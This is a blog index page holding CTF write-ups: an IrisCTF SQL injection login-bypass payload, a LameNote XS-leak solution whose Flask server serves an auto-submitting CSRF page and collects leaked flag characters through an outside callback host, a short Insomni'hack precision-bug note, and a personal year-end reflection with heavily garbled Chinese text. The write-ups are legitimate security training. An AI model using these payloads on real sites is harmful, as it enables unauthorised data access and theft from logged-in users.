<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"chensonghi.github.io.","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Sidebar Display (only for Muse | Mist), available values":["always  expand for all pages automatically."],"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Record my study life">
<meta property="og:type" content="website">
<meta property="og:title" content="chleynx&#39;s blog">
<meta property="og:url" content="https://chensonghi.github.io./page/2/index.html">
<meta property="og:site_name" content="chleynx&#39;s blog">
<meta property="og:description" content="Record my study life">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="chleynx">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://chensonghi.github.io./page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>chleynx's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">chleynx's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>æ—¥ç¨‹è¡¨</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/IrisCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/05/IrisCTF/" class="post-title-link" itemprop="url">IrisCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2024-02-05 00:39:11 / ä¿®æ”¹æ—¶é—´ï¼š00:40:44" itemprop="dateCreated datePublished" datetime="2024-02-05T00:39:11+08:00">2024-02-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Whatâ€™s-My-Password"><a href="#Whatâ€™s-My-Password" class="headerlink" title="Whatâ€™s My Password"></a>Whatâ€™s My Password</h2><p>sql injection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;skat&quot;,&quot;password&quot;:&quot;\&quot; union select username,password from users where username=\&quot;skat\&quot;#&quot;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="LameNote"><a href="#LameNote" class="headerlink" title="LameNote"></a>LameNote</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Note challenges are lame so I made a lamer one. Flag matches irisctf&#123;[a-z_]+&#125;</span><br><span class="line"></span><br><span class="line">Admin will log in, make a note with the flag, then visit your link. (Sorry if the timeout is a bit broken on this challenge, there&#x27;s no PoW on the admin bot so feel free to spam it a bit)</span><br><span class="line"></span><br><span class="line">nc lamenote-adminbot.chal.irisc.tf 10300</span><br><span class="line"></span><br><span class="line">Hint!</span><br><span class="line">Please redownload if you downloaded server files at the start of the event.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/e71696da-6929-44f6-843a-ade7f472026a/lamenote.tar.gz">lamenote.tar.gz</a></p>
<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/d843f21b-391a-4c6a-9022-f34c2e512058/lamenote-adminbot.tar.gz">lamenote-adminbot.tar.gz</a></p>
<p>maybe <a target="_blank" rel="noopener" href="https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks</a></p>
<p>tryingâ€¦</p>
<p>there is always response 200, so seems like not this</p>
<p>Got idea: In our resourse need make bot to create a new note with content <strong>irisctf{a</strong> and with img url to <strong>any webhook</strong>, then in iframe open the <em><strong>&#x2F;search?query&#x3D;irisctf{a</strong></em></p>
<ul>
<li>if there is only our note matches then server will open our note and request to our webhook</li>
<li>if there is more than 1 note with â€œirisctf{aâ€ then response will be just urls of notes, no request to webhook, so we can extract the symbol of flag</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, make_response, request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> <span class="variable constant_">CORS</span></span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"><span class="title function_">CORS</span>(app)</span><br><span class="line">callbacks = []</span><br><span class="line">temp = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;</span>test<span class="string">&quot; style=&quot;</span><span class="attr">display</span>:none;<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;</span>test2<span class="string">&quot; style=&quot;</span><span class="attr">display</span>:none;<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;</span>&lt;<span class="attr">https</span>:<span class="comment">//lamenote-web.chal.irisc.tf/create&gt;&quot; method=&quot;POST&quot; target=&quot;test&quot;&gt;</span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Flag&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;irisctf<span class="symbol">&amp;#123;</span>&#123;&#125;&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span>edu<span class="symbol">&amp;#46;</span>ghost1032<span class="symbol">&amp;#46;</span>top/callback<span class="symbol">&amp;#63;</span>callback<span class="symbol">&amp;#61;</span>&#123;&#125;&amp;index=&#123;&#125;&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&lt;https://lamenote-web.chal.irisc.tf/search&gt;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">target</span>=<span class="string">&quot;test2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">value</span>=<span class="string">&quot;irisctf<span class="symbol">&amp;#123;</span>&#123;&#125;&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">1</span>].<span class="title function_">submit</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">@app.route(&#x27;/leak/&lt;i&gt;/&lt;string&gt;&#x27;)</span></span><br><span class="line"><span class="string">def index(i,string):</span></span><br><span class="line"><span class="string">    return make_response(temp.format(string, string, i , string))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/callback&#x27;)</span></span><br><span class="line"><span class="string">def cb():</span></span><br><span class="line"><span class="string">    cb = request.args.get(&#x27;callback&#x27;) </span></span><br><span class="line"><span class="string">    index = int(request.args.get(&#x27;index&#x27;))</span></span><br><span class="line"><span class="string">    if len(callbacks) &lt;= index:</span></span><br><span class="line"><span class="string">        callbacks.append(&#123;&#125;)</span></span><br><span class="line"><span class="string">    if cb in callbacks[index]:</span></span><br><span class="line"><span class="string">        callbacks[index][cb] += 1</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        callbacks[index][cb] = 1</span></span><br><span class="line"><span class="string">    print(callbacks)</span></span><br><span class="line"><span class="string">    return make_response(&#x27;&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/result&#x27;)</span></span><br><span class="line"><span class="string">def result():</span></span><br><span class="line"><span class="string">    index = int(request.args.get(&#x27;index&#x27;))</span></span><br><span class="line"><span class="string">    if index &gt;= len(callbacks):</span></span><br><span class="line"><span class="string">        return make_response(&#x27;Nope&#x27;)</span></span><br><span class="line"><span class="string">    return make_response(str(callbacks[index]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.run(debug=True, port=48080)</span></span><br></pre></td></tr></table></figure>

<p>example:</p>
<p>echo â€œ<a target="_blank" rel="noopener" href="https://edu.ghost1032.top/leak/0/pz">https://edu.ghost1032.top/leak/0/pz</a>â€œ | nc -q 0 <a target="_blank" rel="noopener" href="http://lamenote-adminbot.chal.irisc.tf/">lamenote-adminbot.chal.irisc.tf</a> 10300 would have 2 callback requests</p>
<p>while</p>
<p>echo â€œ<a target="_blank" rel="noopener" href="https://edu.ghost1032.top/leak/0/pl">https://edu.ghost1032.top/leak/0/pl</a>â€œ | nc -q 0 <a target="_blank" rel="noopener" href="http://lamenote-adminbot.chal.irisc.tf/">lamenote-adminbot.chal.irisc.tf</a> 10300 only has 1 callback request.</p>
<p>You should try a couple of times for every char, since <code>Sorry if the timeout is a bit broken on this challenge</code></p>
<p>And thatâ€™s why I donâ€™t have a working full-automatic exp :(</p>
<p>Maybe we can solve the issue by making multiple tries for every char.</p>
<p>I made some exploit, trying now â€¦</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;please_no_more_unintended_bugs&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/Insomni-hack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/05/Insomni-hack/" class="post-title-link" itemprop="url">Insomni'hack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2024-02-05 00:00:09 / ä¿®æ”¹æ—¶é—´ï¼š00:21:02" itemprop="dateCreated datePublished" datetime="2024-02-05T00:00:09+08:00">2024-02-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="InsoBank"><a href="#InsoBank" class="headerlink" title="InsoBank"></a>InsoBank</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">by clZ</span><br><span class="line"></span><br><span class="line">We&#x27;re launching a new online Bank today which is of course backed by crypto and AI which makes it better than any other banking system out there.</span><br><span class="line"></span><br><span class="line">It&#x27;s not fully featured yet as you can only transfer money within your own accounts, but you can already see how superior it is to other systems:</span><br><span class="line"></span><br><span class="line">http://91.92.201.197:3000/</span><br><span class="line"></span><br><span class="line">Source: here</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (accountid,name,balance) in cursor.fetchall():</span><br><span class="line">        if balance &gt; 13.37:</span><br><span class="line">            results[accountid] = &#123;&#x27;name&#x27;: name, &#x27;balance&#x27;: balance, &#x27;flag&#x27;: FLAG&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/05/Insomni-hack/image-20240204225812809-1707062535487-1.png" alt="image-20240204225812809"></p>
<p>pythonç²¾åº¦é—®é¢˜</p>
<p><img src="/2024/02/05/Insomni-hack/image-20240204225846640-1707062535488-2.png" alt="image-20240204225846640"></p>
<p>ok</p>

      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/01/29/my2023total/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/01/29/my2023total/" class="post-title-link" itemprop="url">My 2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2024-01-29 13:38:57" itemprop="dateCreated datePublished" datetime="2024-01-29T13:38:57+08:00">2024-01-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-02-05 00:19:33" itemprop="dateModified" datetime="2024-02-05T00:19:33+08:00">2024-02-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Total/" itemprop="url" rel="index"><span itemprop="name">Total</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>emmmï¼Œæˆ‘ä¹Ÿæƒ³æ€»ç»“ä¸€ä¸‹ä¸‹ï¼ˆQWQï¼‰æˆ‘çš„2023ã€‚</p>
<p><img src="/2024/01/29/my2023total/wps1.png" alt="img"> </p>
<h2 id="å¼€å§‹"><a href="#å¼€å§‹" class="headerlink" title="å¼€å§‹"></a>å¼€å§‹</h2><p>é«˜è€ƒå®Œä¹‹åï¼Œè«åçš„å°±åƒå¡«è®¡ç®—æœºå•¦ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥ã€‚è¿›å…¥å­¦æ ¡å‘ç°å¹¶ä¸”æ¥è§¦åˆ°å°çº¢å¸½è¿™ä¸ªç»„ç»‡ï¼Œå…¶å®æˆ‘è¶…çº§ç¤¾æï¼Œç»è¿‡å­¦é•¿çš„å¸®åŠ©æˆ‘æˆåŠŸè¿›å…¥äº†ç½‘ç»œéƒ¨ï¼Œvocalï¼Œå‘ç°è¿™é‡Œæœ‰è¶…çº§ğŸ‚è€Œä¸”è¿˜å–œæ¬¢å¸®åŠ©æˆ‘ä»¬çš„å­¦é•¿å­¦å§ï¼Œä¹Ÿæœ‰å¿—åŒé“åˆçš„æœ‹å‹ï¼Œæ„Ÿè§‰çœŸæ˜¯å¹¸ç¦äº†ã€‚ç„¶åå°±å¼€å§‹æ­£å¼å¼€å§‹å‰ç«¯å•¦ï¼Œä¸çŸ¥é“æ˜¯å› ä¸ºå–œæ¬¢è¿˜æ˜¯æƒ³åŠªåŠ›ä¸€ç‚¹ï¼Œåæ­£å°±æ˜¯ç»å¸¸éƒ½å­¦åˆ°æ·±å¤œï¼Œç„¶ååœ¨å­¦é•¿å­¦å§çš„æ¨èâ†“å‚åŠ äº†ç½‘é¡µè®¾è®¡å¤§èµ›ï¼Œå‘ƒå‘ƒå‘ƒç¬¬äºŒåï¼Œæˆ‘æœ‰äº¿ç‚¹ç¤¾æç„¶åè¿˜æ²¡æœ‰å‡†å¤‡ï¼Œç­”è¾©çš„æ—¶å€™ï¼Œæˆ‘ä¸çŸ¥é“æˆ‘ä»¬åœ¨è®²äº›å•¥ï¼Œå“ˆå“ˆå“ˆæ€»å½’å­¦äº†é‚£ä¹ˆä¹…è¿˜æ˜¯æœ‰ç‚¹æ”¶è´§å•¦</p>
<p><img src="/2024/01/29/my2023total/wps2.png" alt="img"> </p>
<h2 id="ç½‘å®‰"><a href="#ç½‘å®‰" class="headerlink" title="ç½‘å®‰"></a>ç½‘å®‰</h2><p>æ€ä¹ˆè¯´å‘¢ï¼Œä¹Ÿæ˜¯åœ¨å­¦é•¿çš„å¸®åŠ©ä¸‹ï¼ŒåŠ ä¸Šè¿™ä¸ªä¸œè¥¿æœ‰ç‚¹å…´è¶£ï¼Œå°±æ‹‰ç€ä¸€ä¸ªæŒºä¸Šè¿›çš„å®¤å‹å»å‚åŠ äº†ä¸€ä¸ªemmmç®—æ˜¯å°åŸ¹è®­å§ï¼Œvocalåœ¨è¿™é‡Œåˆè®¤è¯†äº†å¦å¤–ä¸€äº›å­¦é•¿å­¦å§ï¼Œæ°é€¢ç½‘é¡µè®¾è®¡å¤§èµ›ä¹‹å‰ï¼Œæˆ‘ä¹Ÿæ°å¥½é‡åˆ°ä¸€äº›é—®é¢˜ï¼Œåæ­£å°±æ²¡å¬è¿™ä¸ªåŸ¹è®­çš„å†…å®¹(åé¢è¢«ä¸¾æŠ¥äº†d(ÅĞ´Åà¹‘)ï¼Œå°±å…¨å»é—®å¤§ä½¬ç½‘é¡µçš„é—®é¢˜äº†ã€‚</p>
<p>ç„¶åå°±æ˜¯å›½èµ›çš„æ‹›æ–°èµ›å•¦ï¼æˆ‘åªèƒ½è¯´æ˜¯çœŸçš„æœ‰ç‚¹è¿æ°”å¥½ï¼Œå«ä¸Šæˆ‘çš„å®¤å‹ï¼Œæˆ‘ä»¬å°±å¼€å§‹ç¬¬ä¸€æ¬¡CTFäº†ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œæ„Ÿè§‰æœ‰ç§æœ‰ç‚¹ä¸Šç˜¾çš„æ„Ÿè§‰ï¼Œå“ˆå“ˆå“ˆåæ¥æ‰çŸ¥é“ï¼Œè¿˜æ˜¯å­¦é•¿å¾ˆç”¨å¿ƒçš„å‡ºäº†é€‚åˆæˆ‘ä»¬çš„é¢˜ç›®(ä¸ç„¶åªèƒ½å½“åœºé€€å½¹äº†)ï¼Œæ°å¥½ä¹‹å‰å­¦äº†ä¸€ç‚¹ç‚¹å‰ç«¯ï¼Œå†åŠ ä¸Šå®¤å‹å½“æ—¶å¬äº†ä¸€äº›åŸ¹è®­çš„å†…å®¹ï¼Œæ€»ä¹‹æˆ‘ä»¬ä¿©è¿˜æ˜¯æˆåŠŸé€‰ä¸Šäº†ã€‚åˆ°äº†å›½èµ›åˆèµ›æˆ‘æ‰çŸ¥é“ï¼ŒCTFçš„ä¸åŒï¼Œæ ¡å†…é€‰æ‹”èµ›å…¨é å­¦é•¿åŠªåŠ›ï¿½ï¿½ï¿½ï¼Œæˆ‘æ ¹æœ¬ä¸ä¼šå•Šï¼Œæˆ‘è®°å¾—å­¦é•¿é—®æˆ‘è¿™ä¸ªç¬¦å·æ˜¯å•¥  ^   å…¶å®æˆ‘å¾ˆæ‡µï¼Œæˆ‘æ ¹æœ¬ä¸çŸ¥é“å•Šï¼Œæˆ‘è¿åˆ«äººåšå¥½çš„æˆ‘è¿è„šæœ¬éƒ½çœ‹ä¸æ‡‚ï¼Œä½†å¥½åœ¨å­¦é•¿å­¦å§åŠªåŠ›ï¿½ï¿½ï¿½ï¼Œæˆ‘æˆåŠŸè¿›çº¿ä¸‹èµ›å•¦ã€‚è™½ç„¶æˆ‘ä»¬é˜Ÿæ²¡æœ‰å–å¾—å¥½æˆç»©ï¼Œå±äºæ˜¯ç›´æ¥å»æ—…æ¸¸å•¦ï¼ˆçœŸçš„æ˜¯å»æ—…æ¸¸çš„ï¼çœŸçš„ï¼‰ï¼Œä½†æ˜¯ç°åœ¨æ‰çŸ¥é“ï¼Œæ‰æ¥è§¦CTFå°±æœ‰è¿™ç§æœºä¼šï¼ŒçœŸçš„è¶…çº§å¹¸è¿äº†ï¼ˆè¯´ä¸å®Œæ ¹æœ¬è¯´ä¸å®Œï¼Œåªèƒ½æ„Ÿè°¢å­¦é•¿ä»¬äº†@kdxcxsï¼Œ@CH3NQUï¼‰â€¦â€¦â€¦â€¦çœŸçš„ä¸€è·¯å…¨é å¸¦</p>
<p><img src="/2024/01/29/my2023total/wps3.png" alt="img"> </p>
